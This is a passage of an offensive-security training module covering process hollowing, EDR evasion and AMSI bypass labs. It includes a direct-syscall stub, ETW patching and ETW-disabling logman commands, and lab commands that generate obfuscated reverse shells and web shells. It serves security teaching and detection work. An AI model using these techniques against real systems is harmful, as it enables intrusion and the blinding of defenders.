**Step 2: Query Process Information**

```
NtQueryInformationProcess() Purpose:

- Retrieves ProcessBasicInformation
- Contains PEB (Process Environment Block) address
- PEB contains ImageBaseAddress

PROCESS_BASIC_INFORMATION Structure:
+---------------------------+
| ExitStatus                |
| PebBaseAddress       -----+---> PEB
| AffinityMask              |     +------------------+
| BasePriority              |     | ImageBaseAddress |
| UniqueProcessId           |     | ProcessParameters|
| InheritedFromUniqueProcessId    | ...              |
+---------------------------+     +------------------+
```

**Step 3: Unmap Original Image**

```
NtUnmapViewOfSection() Operation:

- Removes the original executable from memory
- Target: Original image base address
- Creates "hollow" in process memory

Before:                    After:
+----------------+         +----------------+
| PE Header      |         | [Unmapped]     |
| .text section  |  --->   | [Unmapped]     |
| .data section  |         | [Unmapped]     |
| .rsrc section  |         | [Unmapped]     |
+----------------+         +----------------+
```

**Step 4: Allocate New Memory**

```
VirtualAllocEx() Parameters:

- hProcess: Target process handle
- lpAddress: Preferred base (original image base)
- dwSize: Size of payload
- flAllocationType: MEM_COMMIT | MEM_RESERVE
- flProtect: PAGE_EXECUTE_READWRITE

Goal: Allocate at same address as original image
      (or handle relocation if different)
```

**Step 5: Write Payload**

```
WriteProcessMemory() Operations:

1. Write PE headers to base address
2. For each section:
   - Calculate destination address
   - Write section data
   - Set appropriate permissions

Memory Layout:
+------------------+ <- Base Address
| DOS Header       |
| PE Header        |
| Section Headers  |
+------------------+
| .text section    |
+------------------+
| .data section    |
+------------------+
| Other sections   |
+------------------+
```

**Step 6: Fix Image Base in PEB**

```
PEB Update Requirement:

If payload loaded at different base than compiled:
- Update PEB.ImageBaseAddress
- Allows loader to find correct image base

WriteProcessMemory() to:
PEB + offset(ImageBaseAddress)
```

**Step 7: Set Thread Context**

```
Thread Context Modification:

1. GetThreadContext() - retrieve current context

2. Modify entry point:
   - x86: context.Eax = new entry point
   - x64: context.Rcx = new entry point

3. SetThreadContext() - apply modified context

CONTEXT Structure (simplified):
+------------------+
| ContextFlags     |
| Eax/Rax (x86/64) | <- Entry point for new process
| Ebx/Rbx          | <- PEB address
| Eip/Rip          | <- Instruction pointer
| ...              |
+------------------+
```

**Step 8: Resume Execution**

```
ResumeThread() Final Step:

- Decrements suspend count
- Thread begins execution
- Executes from modified entry point
- Malicious code runs as "legitimate" process
```

### Common Target Processes

| Process | Path | Suspicion Level | Notes |
|---------|------|-----------------|-------|
| svchost.exe | C:\Windows\System32\ | Low | Multiple instances normal |
| RuntimeBroker.exe | C:\Windows\System32\ | Low | Modern Windows |
| notepad.exe | C:\Windows\System32\ | Medium | GUI expected |
| explorer.exe | C:\Windows\ | High | Single instance expected |

### Detection Mechanisms

```
PROCESS HOLLOWING DETECTION POINTS

+------------------------------------------------------------------+
| DETECTION LAYER      | WHAT TO MONITOR                           |
+------------------------------------------------------------------+
| API Monitoring       | - CreateProcess + CREATE_SUSPENDED        |
|                      | - NtUnmapViewOfSection calls              |
|                      | - WriteProcessMemory to suspended proc    |
|                      | - SetThreadContext modifications          |
+------------------------------------------------------------------+
| Memory Analysis      | - Image path vs memory content mismatch   |
|                      | - Private pages in signed module          |
|                      | - PEB.ImageBaseAddress anomalies          |
|                      | - RWX memory in trusted processes         |
+------------------------------------------------------------------+
| Behavioral           | - Network from unexpected process         |
|                      | - Child process with wrong parent         |
|                      | - Missing expected command line args      |
|                      | - Process with no associated window       |
+------------------------------------------------------------------+
```

### Windows API Reference

```
KEY APIs FOR PROCESS HOLLOWING

+----------------------+------------+--------------------------------+
| Function             | DLL        | Purpose                        |
+----------------------+------------+--------------------------------+
| CreateProcessA/W     | kernel32   | Create suspended process       |
| NtQueryInformation-  | ntdll      | Get PEB address                |
|   Process            |            |                                |
| NtUnmapViewOfSection | ntdll      | Remove original image          |
| VirtualAllocEx       | kernel32   | Allocate memory in target      |
| WriteProcessMemory   | kernel32   | Write payload to target        |
| GetThreadContext     | kernel32   | Get thread state               |
| SetThreadContext     | kernel32   | Modify thread entry point      |
| ResumeThread         | kernel32   | Start execution                |
+----------------------+------------+--------------------------------+
```

### Command Reference

```bash
# Show tool documentation
python process_hollowing.py --doc

# List common target processes
python process_hollowing.py --list-targets

# Plan mode for specific target
python process_hollowing.py --target svchost.exe --plan

# Educational demonstration
python process_hollowing.py --target notepad.exe --demo

# Explain specific step (1-8)
python process_hollowing.py --step 3

# Detection guidance for defenders
python process_hollowing.py --detection-guide

# Plan with PPID spoofing
python process_hollowing.py --target svchost.exe --ppid-spoof --plan

# JSON output
python process_hollowing.py --list-targets --json
```

---

## EDR Evasion Toolkit

### Tool Overview

The EDR Evasion Toolkit provides educational demonstrations of techniques used to evade Endpoint Detection and Response solutions. Understanding these techniques is essential for both offensive testing and defensive tuning.

**Tool Location:** `/Users/ic/cptc11/python/tools/edr-evasion-toolkit/edr_evasion.py`

### Direct Syscalls

**Why Direct Syscalls?**

EDRs typically hook user-mode API functions in ntdll.dll. Direct syscalls bypass these hooks by calling the kernel directly.

```
NORMAL API CALL vs DIRECT SYSCALL

Normal Path (Hooked):
+-------------+    +-------------+    +-------------+    +--------+
| Application |--->| kernel32.dll|--->| ntdll.dll   |--->| Kernel |
+-------------+    +-------------+    +-------------+    +--------+
                                           |
                                    [EDR Hook Here]
                                           |
                                           v
                                    +-------------+
                                    | EDR Agent   |
                                    | (Monitors)  |
                                    +-------------+

Direct Syscall Path:
+-------------+                                          +--------+
| Application |----------------------------------------->| Kernel |
+-------------+    (Bypasses user-mode hooks)            +--------+
```

**Syscall Stub Structure (x64):**

```nasm
; Direct Syscall Stub: NtAllocateVirtualMemory
; Syscall Number: 0x18
; Platform: Windows x64

NtAllocateVirtualMemory PROC
    mov r10, rcx                ; Move first param to r10
    mov eax, 018h               ; Syscall number
    syscall                     ; Execute syscall
    ret                         ; Return
NtAllocateVirtualMemory ENDP
```

**Common Syscalls Used in Offensive Operations:**

| Syscall | Number (Win10) | Purpose | Hooked By |
|---------|---------------|---------|-----------|
| NtAllocateVirtualMemory | 0x18 | Allocate memory | Most EDRs |
| NtWriteVirtualMemory | 0x3A | Write to process | Most EDRs |
| NtCreateThreadEx | 0xC1 | Create thread | Most EDRs |
| NtProtectVirtualMemory | 0x50 | Change protection | CrowdStrike, Carbon Black |
| NtOpenProcess | 0x26 | Open process handle | Most EDRs |
| NtQueueApcThread | 0x45 | Queue APC | CrowdStrike, SentinelOne |

### Unhooking Techniques

**Full DLL Unhooking:**

```
FULL DLL UNHOOKING PROCESS

1. Get handle to loaded ntdll.dll
   +------------------+
   | Hooked ntdll.dll |
   | [JMP to EDR]     |
   +------------------+

2. Read clean ntdll.dll from disk
   +------------------+
   | C:\Windows\      |
   | System32\        |
   | ntdll.dll        |
   +------------------+

3. Parse PE headers, find .text section

4. Change memory protection to RWX
   VirtualProtect(ntdll_text, size, PAGE_EXECUTE_READWRITE, &old)

5. Copy clean .text over hooked version
   memcpy(ntdll_text, clean_text, text_size)

6. Restore memory protection
   VirtualProtect(ntdll_text, size, old, &old)

Result:
   +------------------+
   | Clean ntdll.dll  |
   | [Original code]  |
   +------------------+
```

**Syscall Stub Restoration:**

```
IDENTIFYING HOOKED FUNCTIONS

Clean syscall stub (x64):
4C 8B D1          mov r10, rcx
B8 XX XX XX XX    mov eax, <syscall_number>
0F 05             syscall
C3                ret

Hooked syscall stub:
E9 XX XX XX XX    jmp <hook_address>  <- EDR hook!
...               (rest overwritten)

Restoration: Copy original bytes back to function start
```

**Alternative Unhooking Sources:**

1. **KnownDLLs Section:** `\KnownDlls\ntdll.dll`
2. **Suspended Process:** Create suspended process, read its ntdll
3. **Debugging APIs:** Debug a process to read its ntdll

### ETW Bypass

ETW (Event Tracing for Windows) is used by security products to monitor system activity.

```
ETW BYPASS VIA PATCHING

Target: ntdll!EtwEventWrite

Original Function:
EtwEventWrite:
    [function prologue]
    [event writing code]
    ret

Patched Function:
EtwEventWrite:
    ret                    <- Returns immediately
    [dead code...]

Implementation:
1. Resolve EtwEventWrite address
2. Change protection to RWX
3. Write 0xC3 (ret) to first byte
4. Restore protection
```

**ETW Provider Disabling:**

```powershell
# List active ETW sessions
logman query providers

# Disable specific providers (requires admin)
logman stop "EventLog-Microsoft-Windows-DotNETRuntime" -ets
logman stop "EventLog-Microsoft-Windows-PowerShell" -ets
```

### API Hashing

API hashing resolves function addresses using hash values instead of strings, evading static analysis.

```
API HASHING CONCEPT

Traditional (Detectable):
    HMODULE kernel32 = LoadLibrary("kernel32.dll");
    void* func = GetProcAddress(kernel32, "VirtualAlloc");

String "VirtualAlloc" appears in binary -> Detectable

With API Hashing:
    HMODULE kernel32 = find_module_by_hash(0x6A4ABC5B);
    void* func = find_export_by_hash(kernel32, 0x91AFCA54);

No strings -> Harder to detect

DJB2 Hash Algorithm:
def djb2(name):
    h = 5381
    for c in name:
        h = ((h << 5) + h) + ord(c)
    return h & 0xFFFFFFFF

Example Hashes:
- VirtualAlloc:  0x91AFCA54
- CreateThread:  0x7C826E4
- WriteFile:     0x1F790AE5
```

### Memory Evasion Techniques

**Module Stomping:**

```
MODULE STOMPING TECHNIQUE

1. Load legitimate DLL:
   LoadLibrary("C:\\Windows\\System32\\amsi.dll")

2. Find writable section in loaded DLL

3. Overwrite with payload:
   +-------------------+
   | amsi.dll (loaded) |
   | .text: [payload]  | <- Payload hidden here
   | .data: [original] |
   +-------------------+

4. Execute from "legitimate" module memory

Benefits:
- Memory region attributed to signed DLL
- Call stack shows Microsoft module
- Some scanners skip signed modules
```

**Sleep Encryption:**

```
SLEEP ENCRYPTION FLOW

      +-----------+    +----------+    +-----------+
      |  Active   |--->| Encrypt  |--->|  Sleeping |
      |  Payload  |    |  Memory  |    | (Encrypted)|
      +-----------+    +----------+    +-----------+
           ^                                |
           |                                |
           |          +----------+          |
           +----------|  Decrypt |<---------+
                      |  Memory  |
                      +----------+

Implementation:
1. Generate random key
2. Encrypt payload memory region
3. Change protection to RW (remove Execute)
4. Sleep for specified duration
5. Restore protection to RX
6. Decrypt payload
7. Zero key from memory
8. Resume operation
```

**Avoiding RWX Memory:**

```
MEMORY PROTECTION EVOLUTION

Bad (Highly Suspicious):
1. VirtualAlloc(..., PAGE_EXECUTE_READWRITE)  <- RWX!
2. Write shellcode
3. Execute

Better:
1. VirtualAlloc(..., PAGE_READWRITE)          <- RW only
2. Write shellcode
3. VirtualProtect(..., PAGE_EXECUTE_READ)     <- Change to RX
4. Execute

Best:
1. Create RW section
2. Write shellcode
3. Create second RX mapping of same pages
4. Execute from RX mapping
(Never has RWX at any point)
```

### Command Reference

```bash
# List all techniques
python edr_evasion.py --list

# Plan mode for specific technique
python edr_evasion.py --technique direct_syscalls --plan

# List available syscalls
python edr_evasion.py --list-syscalls

# Get syscall information
python edr_evasion.py --syscall NtAllocateVirtualMemory

# Generate syscall stubs
python edr_evasion.py --generate-stubs NtAllocateVirtualMemory,NtWriteVirtualMemory

# Generate API hashes
python edr_evasion.py --hash-apis VirtualAlloc,CreateThread,WriteFile

# Filter techniques by category
python edr_evasion.py --list --category unhooking

# JSON output
python edr_evasion.py --technique etw_patching --json
```

---

## MITRE ATT&CK Mapping

### Technique ID Reference

| Tool | Techniques | MITRE IDs |
|------|------------|-----------|
| **Payload Generator** | Command and Scripting Interpreter | T1059 |
| | PowerShell | T1059.001 |
| | Python | T1059.006 |
| | Unix Shell | T1059.004 |
| | Ingress Tool Transfer | T1105 |
| **Shellcode Encoder** | Obfuscated Files or Information | T1027 |
| | Software Packing | T1027.002 |
| | Binary Padding | T1027.001 |
| **AMSI Bypass** | Impair Defenses | T1562 |
| | Disable or Modify Tools | T1562.001 |
| | Indicator Blocking | T1562.006 |
| **Process Hollowing** | Process Injection | T1055 |
| | Process Hollowing | T1055.012 |
| **EDR Evasion** | Native API | T1106 |
| | Disable or Modify Tools | T1562.001 |
| | Indicator Blocking | T1562.006 |
| | Obfuscated Files or Information | T1027 |

### Detection Opportunities

```
MITRE ATT&CK DETECTION MATRIX

+------------------+----------------------------------+------------------+
| Technique        | Data Sources                     | Detection ID     |
+------------------+----------------------------------+------------------+
| T1059.001        | Process Creation                 | DS0009           |
| PowerShell       | Command Execution                | DS0017           |
|                  | Script Execution                 | DS0012           |
+------------------+----------------------------------+------------------+
| T1027            | File Metadata                    | DS0022           |
| Obfuscation      | File Content                     | DS0022           |
+------------------+----------------------------------+------------------+
| T1055.012        | Process Creation                 | DS0009           |
| Process Hollow   | Process Access                   | DS0009           |
|                  | Process Modification             | DS0009           |
+------------------+----------------------------------+------------------+
| T1562.001        | Windows Registry                 | DS0024           |
| Disable Tools    | Process Creation                 | DS0009           |
|                  | Service Modification             | DS0019           |
+------------------+----------------------------------+------------------+
| T1106            | OS API Execution                 | DS0009           |
| Native API       | Process Creation                 | DS0009           |
+------------------+----------------------------------+------------------+
```

### Reporting Template

When documenting findings, map techniques to ATT&CK:

```
FINDING REPORT TEMPLATE

Technique Used: Process Hollowing
MITRE ATT&CK ID: T1055.012
Tactic: Defense Evasion, Privilege Escalation

Description:
Successfully performed process hollowing using svchost.exe
as the target process. Payload executed while masquerading
as legitimate Windows process.

Detection Opportunities:
- CreateProcess with CREATE_SUSPENDED flag
- NtUnmapViewOfSection to suspended process
- Memory content mismatch with disk image
- Network connections from svchost.exe without -k flag

Recommendations:
- Enable process creation auditing
- Deploy memory integrity monitoring
- Alert on suspicious parent-child relationships
```

---

## Hands-On Labs

### Lab 1: Payload Generation and Testing

**Objective:** Generate multiple payload types and understand their detection profiles.

**Environment Setup:**
- Kali Linux or similar attack platform
- Windows 10/11 VM (target)
- Network connectivity between systems
- Netcat or similar listener

**Exercise 1.1: Generate and Test Reverse Shells**

```bash
# Step 1: Start listener on attack machine
nc -lvnp 4444

# Step 2: Generate Python reverse shell
python /Users/ic/cptc11/python/tools/payload-generator/payload_generator.py \
    --type reverse_shell --lang python \
    --lhost <YOUR_IP> --lport 4444

# Step 3: Execute on target (with Python installed)
# Copy and paste generated payload

# Step 4: Verify connection established

# Step 5: Generate obfuscated version
python /Users/ic/cptc11/python/tools/payload-generator/payload_generator.py \
    --type reverse_shell --lang python \
    --lhost <YOUR_IP> --lport 4444 --obfuscate 2

# Step 6: Compare detection rates (use VirusTotal or similar)
```

**Exercise 1.2: PowerShell Payload Analysis**

```bash
# Generate base PowerShell payload
python payload_generator.py --type reverse_shell --lang powershell \
    --lhost 192.168.1.10 --lport 443

# Generate with each obfuscation level
for level in 0 1 2 3; do
    echo "=== Level $level ==="
    python payload_generator.py --type reverse_shell --lang powershell \
        --lhost 192.168.1.10 --obfuscate $level
done

# Questions to answer:
# 1. What strings are common across all levels?
# 2. What detection signatures might still match?
# 3. How does encoding affect usability?
```

**Exercise 1.3: Web Shell Deployment**

```bash
# Generate PHP web shell variants
python payload_generator.py --type web_shell --lang php --obfuscate 0
python payload_generator.py --type web_shell --lang php --obfuscate 3

# Deploy to test web server
# Access via browser: http://target/shell.php?cmd=whoami

# Document:
# - Which obfuscation level evades more WAF rules?
# - What additional obfuscation would help?
```

**Validation Criteria:**
- [ ] Successfully established reverse shell connection
- [ ] Generated payloads in at least 3 languages
- [ ] Documented detection differences between obfuscation levels
- [ ] Identified at least 3 detection signatures

---

### Lab 2: Shellcode Encoding Chains

**Objective:** Master shellcode encoding techniques and chain multiple encoders for improved evasion.

**Environment Setup:**
- Access to shellcode encoder tool
- Sample shellcode (provided or generated)
- Analysis tools (hexdump, entropy analyzers)

**Exercise 2.1: Single Encoder Analysis**

```bash
# Create sample shellcode (NOP sled for testing)
echo -n -e '\x90\x90\x90\x90\x90\x90\x90\x90' > /tmp/test_shellcode.bin

# Analyze original
python /Users/ic/cptc11/python/tools/shellcode-encoder/shellcode_encoder.py \
    --input /tmp/test_shellcode.bin --analyze

# Apply XOR encoding
python shellcode_encoder.py --input /tmp/test_shellcode.bin \
    --encoding xor --format hex

# Apply Rolling XOR
python shellcode_encoder.py --input /tmp/test_shellcode.bin \
    --encoding xor_rolling --format hex

# Compare outputs - what patterns remain?
```

**Exercise 2.2: Chain Encoding**

```bash
# Apply chain: XOR -> ADD -> ROT
python shellcode_encoder.py --input /tmp/test_shellcode.bin \
    --chain xor,add,rot --format python

# Apply different chain: RC4 -> XOR
python shellcode_encoder.py --input /tmp/test_shellcode.bin \
    --chain rc4,xor --format c_array

# Questions:
# 1. How does final size compare to original?
# 2. What is the entropy difference?
# 3. What does the decoder stub look like?
```

**Exercise 2.3: Bad Character Avoidance**

```bash
# Encode avoiding NULL, LF, CR
python shellcode_encoder.py --input shellcode.bin \
    --encoding xor --null-free --bad-chars 000a0d

# Verify output contains no bad characters
xxd encoded_output.bin | grep -E "00|0a|0d"

# Try with different encoders if XOR fails
python shellcode_encoder.py --input shellcode.bin \
    --encoding rc4 --null-free
```

**Exercise 2.4: Decoder Stub Analysis**

```bash
# Generate encoder with decoder stub
python shellcode_encoder.py --input shellcode.bin \
    --encoding xor --format hex

# Analyze the decoder stub:
# 1. What is the call/pop technique?
# 2. How does it locate the shellcode?
# 3. What are detection signatures in the stub?
```

**Validation Criteria:**
- [ ] Successfully applied at least 4 different encoders
- [ ] Created a 3-layer encoding chain
- [ ] Generated null-free encoded shellcode
- [ ] Analyzed and documented decoder stub patterns

---

### Lab 3: AMSI Bypass Scenarios

**Objective:** Implement AMSI bypass techniques and understand their detection profiles.

**Environment Setup:**
- Windows 10/11 with PowerShell 5.1+
- Windows Defender enabled
- Administrator access

**Exercise 3.1: Verify AMSI is Active**

```powershell
# Open PowerShell as Administrator

# Test that AMSI is blocking (this should be blocked)
# WARNING: This is a test string - do not execute malicious code
"AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386"

# If AMSI is active, you should see an error
```

**Exercise 3.2: Apply AMSI Bypass**

```bash
# Generate bypass with obfuscation
python /Users/ic/cptc11/python/tools/amsi-bypass/amsi_bypass.py \
    --technique force_amsi_error --obfuscate 2

# Copy output to PowerShell session
# Re-test AMSI test string

# Try different techniques:
python amsi_bypass.py --technique amsi_scan_buffer_patch --obfuscate 2
python amsi_bypass.py --technique reflection_context_null --obfuscate 1
```

**Exercise 3.3: Bypass Chain Testing**

```bash
# Generate multi-technique chain
python amsi_bypass.py --chain

# Test reliability:
# 1. Open fresh PowerShell session
# 2. Apply chain bypass
# 3. Execute test payload
# 4. Document success/failure

# Repeat 5 times, note success rate
```

**Exercise 3.4: Detection Analysis**

```powershell
# Enable Script Block Logging before testing
# Computer Configuration > Administrative Templates >
# Windows Components > Windows PowerShell >
# Turn on PowerShell Script Block Logging

# Apply bypass
# Check Event Viewer: Applications and Services Logs >
# Microsoft > Windows > PowerShell > Operational

# Questions:
# 1. What gets logged even with bypass active?
# 2. Can the bypass itself be detected?
# 3. What artifacts remain?
```

**Validation Criteria:**
- [ ] Successfully bypassed AMSI using at least 3 techniques
- [ ] Documented detection in script block logs
- [ ] Compared success rates of different bypass methods
- [ ] Identified logging artifacts that persist despite bypass

---

### Lab 4: Full Evasion Workflow

**Objective:** Combine all techniques in a realistic evasion scenario.

**Scenario:** Generate, encode, and deliver a payload while evading multiple detection layers.

**Environment Setup:**
- Attack machine with all tools
- Windows target with Defender enabled
- Network connectivity

**Exercise 4.1: Payload Preparation Pipeline**

```bash
# Step 1: Generate base payload
python /Users/ic/cptc11/python/tools/payload-generator/payload_generator.py \
    --type reverse_shell --lang powershell \
    --lhost 192.168.1.10 --lport 443 --obfuscate 2 \
    --encoding base64 > payload_stage1.txt

# Step 2: Prepare AMSI bypass
python /Users/ic/cptc11/python/tools/amsi-bypass/amsi_bypass.py \
    --chain > amsi_bypass.ps1

# Step 3: Combine bypass + payload
cat amsi_bypass.ps1 > final_payload.ps1
echo "" >> final_payload.ps1
# Add payload execution

# Step 4: Test in isolated environment
```

**Exercise 4.2: EDR Considerations**

```bash
# Review EDR evasion options
python /Users/ic/cptc11/python/tools/edr-evasion-toolkit/edr_evasion.py --list

# Generate API hashes for payload
python edr_evasion.py --hash-apis VirtualAlloc,CreateThread

# Document syscall numbers for direct syscall approach
python edr_evasion.py --list-syscalls

# Plan full evasion strategy:
# 1. AMSI bypass for PowerShell
# 2. Direct syscalls for memory operations
# 3. Sleep encryption for persistence
```

**Exercise 4.3: Process Injection Planning**

```bash
# Review process hollowing targets
python /Users/ic/cptc11/python/tools/process-hollowing/process_hollowing.py \
    --list-targets

# Plan hollowing operation
python process_hollowing.py --target svchost.exe --ppid-spoof --plan

# Document the complete attack chain:
# 1. Initial access method
# 2. AMSI bypass
# 3. Memory allocation (direct syscall)
# 4. Process hollowing target
# 5. Persistence mechanism
```

**Exercise 4.4: Detection Gap Analysis**

Create a comprehensive detection analysis:

```
DETECTION GAP ANALYSIS TEMPLATE

+-------------------+------------------+------------------+
| Attack Phase      | Detection Method | Gap/Weakness     |
+-------------------+------------------+------------------+
| Initial execution | Process creation | Base64 encoded   |
|                   | logging          | commands bypass  |
+-------------------+------------------+------------------+
| AMSI bypass       | Script block     | Obfuscated       |
|                   | logging          | patterns missed  |
+-------------------+------------------+------------------+
| Memory allocation | API monitoring   | Direct syscalls  |
|                   |                  | bypass hooks     |
+-------------------+------------------+------------------+
| Process hollowing | Parent-child     | PPID spoofing    |
|                   | analysis         | defeats this     |
+-------------------+------------------+------------------+
```

**Validation Criteria:**
- [ ] Created end-to-end evasion payload
- [ ] Combined at least 3 evasion techniques
- [ ] Documented complete attack chain
- [ ] Performed detection gap analysis
- [ ] Identified at least 5 detection opportunities

---

## Assessment and Validation

### Knowledge Check Questions

1. Explain the difference between encoding and encryption in payload development.

2. Why do reverse shells generally work better than bind shells in corporate environments?

3. What is the purpose of the CREATE_SUSPENDED flag in process hollowing?

4. List three ways an EDR might detect direct syscall usage.

5. Why does PowerShell version 2 bypass AMSI?

6. What is the risk of using RWX memory permissions?

7. Explain the rolling XOR technique and why it provides better evasion than simple XOR.

8. What MITRE ATT&CK technique ID corresponds to process hollowing?

### Practical Assessment

Complete the following tasks without reference materials:

1. Generate an obfuscated PowerShell reverse shell payload
2. Encode shellcode using a 3-layer chain
3. Apply an AMSI bypass with level 2 obfuscation
4. Plan a process hollowing operation against RuntimeBroker.exe
5. Generate syscall stubs for NtAllocateVirtualMemory and NtWriteVirtualMemory

### Self-Evaluation Checklist

- [ ] I can explain how each detection mechanism works
- [ ] I can generate payloads for multiple languages and platforms
- [ ] I understand the tradeoffs between different encoding techniques
- [ ] I can bypass AMSI using multiple methods
- [ ] I understand the process hollowing workflow
- [ ] I can apply EDR evasion techniques appropriately
- [ ] I can map techniques to MITRE ATT&CK framework
- [ ] I understand detection opportunities for each technique

---

## References and Further Reading

### Official Documentation
- MITRE ATT&CK Framework: https://attack.mitre.org/
- Microsoft AMSI Documentation: https://docs.microsoft.com/en-us/windows/win32/amsi/
- Windows API Reference: https://docs.microsoft.com/en-us/windows/win32/api/

### Technical References
- Process Injection Techniques: https://attack.mitre.org/techniques/T1055/
- Shellcode Obfuscation: https://attack.mitre.org/techniques/T1027/
- Defense Evasion: https://attack.mitre.org/tactics/TA0005/

### Tool Documentation
- Payload Generator: `/Users/ic/cptc11/python/tools/payload-generator/`
- Shellcode Encoder: `/Users/ic/cptc11/python/tools/shellcode-encoder/`
- AMSI Bypass: `/Users/ic/cptc11/python/tools/amsi-bypass/`
- Process Hollowing: `/Users/ic/cptc11/python/tools/process-hollowing/`
- EDR Evasion: `/Users/ic/cptc11/python/tools/edr-evasion-toolkit/`

---

## Document Control

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2026-01-10 | Training Development | Initial release |

**Classification:** Training Material - Authorized Use Only

**Distribution:** Limited to authorized security training participants

---

*This training material is for authorized security testing and educational purposes only. Unauthorized use of these techniques is illegal and unethical. Always obtain proper authorization before conducting security testing.*
